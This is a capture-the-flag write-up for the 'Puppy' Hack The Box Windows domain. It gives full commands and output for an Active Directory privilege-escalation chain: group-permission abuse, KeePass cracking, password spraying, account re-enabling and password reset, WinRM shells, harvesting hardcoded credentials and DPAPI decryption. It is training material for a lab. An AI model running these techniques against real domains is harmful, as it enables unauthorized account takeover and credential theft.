Puppy¶

TL;DR¶

Phase Technique
Initial Access Provided creds (simulated phishing)
levi.james → DEVELOPERS GenericWrite group abuse
DEVELOPERS → ant.edwards KeePass database cracking
ant.edwards → adam.silver GenericAll + account enable
adam.silver → steph.cooper Backup file with hardcoded creds
steph.cooper → Domain Admin DPAPI credential decryption

Box Info¶

Property Value
Name Puppy
OS Windows Server 2022
Difficulty Medium (30 points)
IP 10.10.11.70
Domain puppy.htb
Release May 17, 2025
Initial Creds levi.james:KingofAkron2025!

Exegol Setup¶

I used Exegol for this box.

# Add the target
exh add hosts --ip '10.10.11.70' -n puppy.htb -n dc.puppy.htb -r DC

# Set as current target
exh set hosts

# Store initial creds (provided in the challenge - simulated phishing)
exh add creds -d puppy.htb -u levi.james -p 'KingofAkron2025!'
exh set creds

BloodHound Analysis¶

Collect AD data for graph analysis:

bloodhound-python -d $DOMAIN -u "$USER" -p "$PASSWORD" -ns $IP -c all

Or with netexec:

nxc ldap $IP -u "$USER" -p "$PASSWORD" --bloodhound --collection All

Import the data into BloodHound CE and look for attack paths.

Key findings: - levi.james is member of the HR group - HR group has GenericWrite on DEVELOPERS group - DEVELOPERS group has access to the DEV SMB share - Senior Devs group has GenericAll over adam.silver

The attack chain becomes clear: 1. levi.james → GenericWrite → Add self to DEVELOPERS 2. Access DEV share → Find KeePass database 3. Crack KeePass → Get ant.edwards creds 4. ant.edwards (Senior Devs) → GenericAll → adam.silver 5. Continue enumeration from there...

GenericWrite Abuse¶

levi.james is in the HR group, which has GenericWrite on the DEVELOPERS group. This means we can modify the group membership and add ourselves!

# Add levi.james to DEVELOPERS group
net rpc group addmem "DEVELOPERS" "$USER" -U "$DOMAIN/$USER%$PASSWORD" -S $IP

Or with bloodyAD:

bloodyAD -u "$USER" -p "$PASSWORD" --host $IP -d $DOMAIN add groupMember "DEVELOPERS" "$USER"

[+] levi.james added to DEVELOPERS

Now let's check if we can access the DEV share:

nxc smb $IP -u "$USER" -p "$PASSWORD" --shares

Share           Permissions     Remark
-----           -----------     ------
DEV             READ

Now we have READ access to DEV!

Exploring the DEV Share¶

smbclient //$IP/DEV -U "$USER%$PASSWORD"

smb: \> ls
  .                                   D        0  Mon Dec 30 20:21:23 2024
  ..                                DHS        0  Tue May  6 09:00:40 2025
  recovery.kdbx                       A     1814  Mon Dec 30 20:21:23 2024

smb: \> get recovery.kdbx

A KeePass database! Let's crack it.

KeePass Cracking¶

We got a KeePass database file. Let's extract the hash and crack the master password.

# Extract hash for John
keepass2john recovery.kdbx > keepass.hash

# Check the hash format
cat keepass.hash

recovery:$keepass$*2*60000*0*...

Cracking with John¶

john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt

liverpool        (recovery)

Weak password! The master password is liverpool.

Extracting Credentials¶

# Using keepassxc-cli
keepassxc-cli export --format csv recovery.kdbx

Enter password: liverpool

Credentials found:

Password Spraying¶

Let's test which credentials are valid:

# Create user list
echo -e "jamie.williams\nadam.silver\nant.edwards\nsteve.tucker\nsamuel.blake" > users.txt

# Create password list
echo -e "JamieLove2025!\nHJKL2025!\nAntman2025!\nSteve2025!\nILY2025!" > passwords.txt

# Spray
nxc smb $IP -u users.txt -p passwords.txt --continue-on-success

SMB  10.10.11.70  445  DC  [+] PUPPY.HTB\ant.edwards:Antman2025!

Got valid creds for ant.edwards!

exh add creds -d $DOMAIN -u ant.edwards -p 'Antman2025!'
exh set creds

GenericAll Exploitation¶

Looking at BloodHound, ant.edwards is member of the Senior Devs group, which has GenericAll on adam.silver. This means we have full control over that account!

But there's a catch. Let's check the account status:

nxc smb $IP -u "$USER" -p "$PASSWORD" -M user-desc

The account adam.silver is disabled (ACCOUNTDISABLE flag set). We need to: 1. Enable the account 2. Reset the password

Enabling the Account¶

# Remove ACCOUNTDISABLE flag
bloodyAD -u "$USER" -p "$PASSWORD" --host $IP -d $DOMAIN remove uac adam.silver -f ACCOUNTDISABLE

[+] UAC flags updated

Resetting the Password¶

# Reset password
bloodyAD -u "$USER" -p "$PASSWORD" --host $IP -d $DOMAIN set password adam.silver 'Password123!'

[+] Password changed successfully!

Getting a Shell¶

exh add creds -d $DOMAIN -u adam.silver -p 'Password123!'
exh set creds

# Test WinRM access
nxc winrm $IP -u "$USER" -p "$PASSWORD"

WINRM  10.10.11.70  5985  DC  [+] PUPPY.HTB\adam.silver:Password123! (Pwn3d!)

evil-winrm -i $IP -u "$USER" -p "$PASSWORD"

User flag!

# On target
*Evil-WinRM* PS C:\Backups> copy site-backup-2024-12-30.zip C:\Users\adam.silver\Documents\

# On attacker
smbclient //$IP/C$ -U "$USER%$PASSWORD" -c "get Users\adam.silver\Documents\site-backup-2024-12-30.zip"

Analyzing the Backup¶

unzip site-backup-2024-12-30.zip

Looking through the files, I found a config file with hardcoded credentials:

cat nms-auth-config.xml.bak

<?xml version="1.0" encoding="UTF-8"?>
<auth-config>
    <ldap-bind-dn>steph.cooper</ldap-bind-dn>
    <ldap-bind-password>ChefSteph2025!</ldap-bind-password>
</auth-config>

Classic mistake - hardcoded LDAP credentials in a backup file!

exh add creds -d $DOMAIN -u steph.cooper -p 'ChefSteph2025!'
exh set creds

# Verify
nxc smb $IP -u "$USER" -p "$PASSWORD"

SMB  10.10.11.70  445  DC  [+] PUPPY.HTB\steph.cooper:ChefSteph2025!

Works! Let's get a shell:

evil-winrm -i $IP -u "$USER" -p "$PASSWORD"

Decrypting the Master Key¶

On our attacker machine, use impacket's dpapi.py:

# Get the user's SID
SID="S-1-5-21-1487982659-1829050783-2281216199-1107"

# Decrypt master key using steph.cooper's password
dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid $SID -password "$PASSWORD"

Summary¶

Step From To Technique
1 levi.james DEVELOPERS GenericWrite group abuse
2 DEVELOPERS ant.edwards KeePass cracking + password spray
3 ant.edwards adam.silver GenericAll + account enable
4 adam.silver steph.cooper Backup file with hardcoded creds
5 steph.cooper steph.cooper_adm DPAPI credential decryption
6 steph.cooper_adm Domain Admin Already admin!

This box is a great example of how AD privilege escalation works in practice. The chain through group permissions, KeePass databases, backup files with credentials, and DPAPI abuse represents realistic attack paths seen in real-world engagements.

Key takeaways: - GenericWrite on groups allows adding members - KeePass databases with weak master passwords are a goldmine - Backup files often contain sensitive credentials - DPAPI can decrypt saved Windows credentials if you have the user's password - Always check for stored credentials in the user's profile!
